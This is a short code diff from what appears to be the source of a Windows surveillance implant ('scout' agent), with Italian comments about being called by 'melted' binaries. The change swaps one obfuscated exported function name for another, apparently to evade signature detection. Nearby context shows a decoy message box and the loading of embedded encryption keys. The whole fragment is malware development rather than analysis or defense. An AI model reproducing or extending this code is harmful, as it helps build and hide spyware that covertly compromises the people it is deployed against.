@@ -43,7 +43,8 @@ HANDLE hScoutSharedMemory;
 //PWCHAR urs73A(PULONG pSynchro) // questa viene richiamata dai meltati
 //__declspec(dllexport) PWCHAR jfk31d1QQ(PULONG pSynchro)
 //__declspec(dllexport) PWCHAR reuio841001a(PULONG pSynchro) // questa viene richiamata dai meltati
-__declspec(dllexport) PWCHAR pqjjslanf(PULONG pSynchro) // questa viene richiamata dai meltati
+//__declspec(dllexport) PWCHAR pqjjslanf(PULONG pSynchro) // questa viene richiamata dai meltati
+__declspec(dllexport) PWCHAR robertlee(PULONG pSynchro) // questa viene richiamata dai meltati
 {
 #ifdef _DEBUG
 	OutputDebugString(L"[+] Setting uMelted to TRUE\n");
@@ -77,7 +78,8 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 		MessageBox(NULL, L"Formatting bios", L"Owning PCI bus", 0);
 		return 0;
 	}
-		
+	
+	
 	memcpy(pServerKey, CLIENT_KEY, 32);
 	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
 	memcpy(pLogKey, ENCRYPTION_KEY, 32);
